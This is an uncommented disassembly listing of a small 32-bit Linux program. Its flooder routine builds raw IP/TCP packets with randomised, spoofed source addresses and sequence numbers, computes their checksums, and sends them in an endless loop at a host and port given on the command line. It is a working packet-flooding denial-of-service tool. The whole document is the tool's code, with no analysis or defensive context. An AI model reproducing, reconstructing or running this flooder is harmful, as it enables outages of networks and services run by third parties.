push   ebp
mov    ebp,esp
push   ebx
call   8048631 <_init+0x9>
pop    ebx
add    ebx,0x1a23
cmp    DWORD PTR [ebx+0x70],0x0
je     8048646 <_init+0x1e>
call   0 <_init-0x8048628>
mov    esi,esi
call   8048890 <frame_dummy>
call   8048e40 <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804a058
jmp    DWORD PTR ds:0x804a05c
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a060
push   0x0
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a064
push   0x8
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a068
push   0x10
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a06c
push   0x18
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a070
push   0x20
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a074
push   0x28
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a078
push   0x30
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a07c
push   0x38
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a080
push   0x40
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a084
push   0x48
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a088
push   0x50
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a08c
push   0x58
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a090
push   0x60
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a094
push   0x68
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a098
push   0x70
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a09c
push   0x78
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0a0
push   0x80
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0a4
push   0x88
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0a8
push   0x90
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0ac
push   0x98
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0b0
push   0xa0
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0b4
push   0xa8
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0b8
push   0xb0
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0bc
push   0xb8
jmp    8048658 <.plt>
jmp    DWORD PTR ds:0x804a0c0
push   0xc0
jmp    8048658 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x8048e74
push   0x8048628
push   ecx
push   esi
push   0x8048c7c
call   8048728 <__libc_start_main@plt>
hlt    
nop
nop
............
push   ebp
mov    ebp,esp
sub    esp,0x8
cmp    DWORD PTR ds:0x804a03c,0x0
jne    804887d <__do_global_dtors_aux+0x4d>
jmp    8048853 <__do_global_dtors_aux+0x23>
mov    eax,ds:0x804a038
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x804a038,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x804a038
cmp    DWORD PTR [eax],0x0
jne    8048841 <__do_global_dtors_aux+0x11>
mov    eax,0x80486f8
test   eax,eax
je     8048873 <__do_global_dtors_aux+0x43>
add    esp,0xfffffff4
push   0x804a040
call   80486f8 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x804a03c,0x1
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,0x8048678
test   eax,eax
je     80488b1 <frame_dummy+0x21>
add    esp,0xfffffff8
push   0x804a188
push   0x804a040
call   8048678 <__register_frame_info@plt>
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8048ec0
mov    eax,ds:0x804a184
push   eax
call   8048698 <fprintf@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048f00
mov    eax,ds:0x804a184
push   eax
call   8048698 <fprintf@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048f40
mov    eax,ds:0x804a184
push   eax
call   8048698 <fprintf@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048f80
mov    eax,ds:0x804a184
push   eax
call   8048698 <fprintf@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x1
call   8048788 <exit@plt>
add    esp,0x10
nop
mov    esp,ebp
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x1c
push   edi
push   esi
push   ebx
mov    edx,DWORD PTR [ebp+0x8]
mov    ecx,DWORD PTR [ebp+0xc]
mov    ebx,ecx
mov    esi,edx
xor    edi,edi
mov    WORD PTR [ebp-0x2],0x0
nop
cmp    ebx,0x1
jg     8048967 <in_cksum+0x23>
jmp    8048976 <in_cksum+0x32>
xor    eax,eax
mov    ax,WORD PTR [esi]
add    edi,eax
add    esi,0x2
add    ebx,0xfffffffe
jmp    8048960 <in_cksum+0x1c>
cmp    ebx,0x1
jne    8048988 <in_cksum+0x44>
mov    al,BYTE PTR [esi]
mov    BYTE PTR [ebp-0x2],al
xor    eax,eax
mov    ax,WORD PTR [ebp-0x2]
add    edi,eax
mov    eax,edi
sar    eax,0x10
mov    DWORD PTR [ebp-0x10],eax
mov    eax,edi
and    eax,0xffff
mov    DWORD PTR [ebp-0x8],eax
mov    edi,DWORD PTR [ebp-0x10]
add    edi,DWORD PTR [ebp-0x8]
mov    eax,edi
sar    eax,0x10
add    edi,eax
mov    eax,edi
xor    eax,0xffff
mov    WORD PTR [ebp-0x2],ax
xor    eax,eax
mov    ax,WORD PTR [ebp-0x2]
mov    DWORD PTR [ebp-0xc],eax
mov    eax,DWORD PTR [ebp-0xc]
jmp    80489c0 <in_cksum+0x7c>
lea    esp,[ebp-0x28]
pop    ebx
pop    esi
pop    edi
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x18
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   8048778 <gethostbyname@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048a13 <lookup+0x47>
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8048fb9
mov    eax,ds:0x804a184
push   eax
call   8048698 <fprintf@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x1
call   8048788 <exit@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [edx]
mov    edx,DWORD PTR [eax]
mov    eax,edx
jmp    8048a21 <lookup+0x55>
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x1c
push   edi
push   esi
push   ebx
add    esp,0xfffffffc
push   0x28
push   0x0
push   0x804a1c0
call   80487b8 <memset@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0x4],0xa
and    BYTE PTR ds:0x804a1c0,0xf0
or     BYTE PTR ds:0x804a1c0,0x5
and    BYTE PTR ds:0x804a1c0,0xf
or     BYTE PTR ds:0x804a1c0,0x40
mov    BYTE PTR ds:0x804a1c9,0x6
mov    BYTE PTR ds:0x804a1c1,0x8
call   80487d8 <rand@plt>
mov    eax,eax
mov    ds:0x804a1c4,ax
mov    WORD PTR ds:0x804a1c2,0x28
mov    WORD PTR ds:0x804a1c6,0x0
mov    BYTE PTR ds:0x804a1c8,0xff
mov    eax,ds:0x804a234
mov    ds:0x804a1d0,eax
mov    BYTE PTR ds:0x804a1e1,0x0
add    esp,0xfffffff4
push   0x4000
call   80487a8 <htons@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a1e2,ax
call   80486c8 <random@plt>
mov    eax,eax
mov    ds:0x804a1d8,eax
mov    DWORD PTR ds:0x804a1dc,0x0
and    BYTE PTR ds:0x804a1e0,0xf
or     BYTE PTR ds:0x804a1e0,0x50
mov    WORD PTR ds:0x804a1e6,0x0
call   80487d8 <rand@plt>
mov    eax,eax
mov    ds:0x804a1d4,ax
cmp    WORD PTR ds:0x804a1a0,0x0
je     8048b28 <flooder+0x100>
add    esp,0xfffffff4
xor    eax,eax
mov    ax,ds:0x804a1a0
push   eax
call   80487a8 <htons@plt>
add    esp,0x10
mov    ebx,eax
jmp    8048b31 <flooder+0x109>
call   80487d8 <rand@plt>
mov    eax,eax
mov    ebx,eax
mov    WORD PTR ds:0x804a1d6,bx
mov    eax,ds:0x804a234
mov    ds:0x804a204,eax
mov    BYTE PTR ds:0x804a208,0x0
mov    BYTE PTR ds:0x804a209,0x6
add    esp,0xfffffff4
push   0x14
call   80487a8 <htons@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a20a,ax
mov    WORD PTR ds:0x804a224,0x2
mov    eax,ds:0x804a234
mov    ds:0x804a228,eax
mov    ax,ds:0x804a1d6
mov    ds:0x804a226,ax
mov    DWORD PTR [ebp-0xc],0x0
nop
lea    esi,[esi+eiz*1+0x0]
call   80486c8 <random@plt>
mov    eax,eax
mov    edx,eax
mov    DWORD PTR ds:0x804a1cc,edx
mov    DWORD PTR ds:0x804a200,edx
inc    WORD PTR ds:0x804a1c4
inc    WORD PTR ds:0x804a1d4
inc    DWORD PTR ds:0x804a1d8
cmp    WORD PTR ds:0x804a1a0,0x0
jne    8048bda <flooder+0x1b2>
call   80487d8 <rand@plt>
mov    eax,eax
mov    edx,eax
mov    WORD PTR ds:0x804a1d6,dx
mov    WORD PTR ds:0x804a226,dx
mov    WORD PTR ds:0x804a1ca,0x0
mov    WORD PTR ds:0x804a1e4,0x0
mov    edi,0x804a20c
mov    esi,0x804a1d4
cld    
mov    ecx,0x5
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
add    esp,0xfffffff8
push   0x14
push   0x804a1c0
call   8048944 <in_cksum>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a1ca,ax
add    esp,0xfffffff8
push   0x20
push   0x804a200
call   8048944 <in_cksum>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a1e4,ax
add    esp,0xfffffff8
push   0x10
mov    eax,0x804a224
push   eax
push   0x0
push   0x28
push   0x804a1c0
mov    eax,ds:0x804a1e8
push   eax
call   80486e8 <sendto@plt>
add    esp,0x20
mov    eax,eax
test   eax,eax
jge    8048c6a <flooder+0x242>
add    esp,0xfffffff4
push   0x8048fd0
call   8048688 <perror@plt>
add    esp,0x10
inc    DWORD PTR [ebp-0xc]
jmp    8048b90 <flooder+0x168>
lea    esp,[ebp-0x28]
pop    ebx
pop    esi
pop    edi
mov    esp,ebp
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x10
push   esi
push   ebx
mov    DWORD PTR [ebp-0x4],0x1
add    esp,0xfffffff4
push   0x8048fe0
call   8048738 <printf@plt>
add    esp,0x10
add    esp,0xfffffffc
push   0xff
push   0x3
push   0x2
call   80487c8 <socket@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a1e8,eax
cmp    DWORD PTR ds:0x804a1e8,0x0
jge    8048ce0 <main+0x64>
add    esp,0xfffffff4
push   0x8049002
call   8048688 <perror@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x1
call   8048788 <exit@plt>
add    esp,0x10
lea    esi,[esi+eiz*1+0x0]
add    esp,0xfffffff4
call   8048758 <getgid@plt>
mov    eax,eax
push   eax
call   80486b8 <setgid@plt>
add    esp,0x10
add    esp,0xfffffff4
call   8048748 <getuid@plt>
mov    eax,eax
push   eax
call   80487e8 <setuid@plt>
add    esp,0x10
cmp    DWORD PTR [ebp+0x8],0x3
jg     8048d1d <main+0xa1>
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   80488d0 <usage>
add    esp,0x10
add    esp,0xfffffff4
push   0x4
lea    eax,[ebp-0x4]
push   eax
push   0x3
push   0x0
mov    eax,ds:0x804a1e8
push   eax
call   8048708 <setsockopt@plt>
add    esp,0x20
mov    eax,eax
test   eax,eax
jge    8048d60 <main+0xe4>
add    esp,0xfffffff4
push   0x8049009
call   8048688 <perror@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x1
call   8048788 <exit@plt>
add    esp,0x10
nop
lea    esi,[esi+eiz*1+0x0]
add    esp,0xfffffff4
add    esp,0xfffffff4
push   0x0
call   8048718 <time@plt>
add    esp,0x10
mov    ebx,eax
call   8048668 <getpid@plt>
mov    esi,eax
call   80486d8 <getppid@plt>
mov    eax,eax
mov    edx,ebx
xor    edx,esi
add    eax,edx
push   eax
call   8048768 <srand@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x8049014
call   8048738 <printf@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,ds:0x804a180
push   eax
call   80486a8 <fflush@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
call   80489cc <lookup>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a234,eax
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x8
mov    edx,DWORD PTR [eax]
push   edx
call   8048798 <atoi@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a1a0,ax
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0xc
mov    edx,DWORD PTR [eax]
push   edx
call   8048798 <atoi@plt>
add    esp,0x10
mov    eax,eax
mov    ds:0x804a222,ax
add    esp,0xfffffff4
push   0x8049026
call   8048738 <printf@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,ds:0x804a180
push   eax
call   80486a8 <fflush@plt>
add    esp,0x10
call   8048a28 <flooder>
xor    eax,eax
jmp    8048e30 <main+0x1b4>
lea    esi,[esi+0x0]
lea    esp,[ebp-0x18]
pop    ebx
pop    esi
mov    esp,ebp
pop    ebp
ret    
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x14
push   ebx
mov    ebx,0x804a044
cmp    DWORD PTR ds:0x804a044,0xffffffff
je     8048e61 <__do_global_ctors_aux+0x21>
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    8048e55 <__do_global_ctors_aux+0x15>
pop    ebx
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   8048e7d <_fini+0x9>
pop    ebx
add    ebx,0x11d7
call   8048830 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
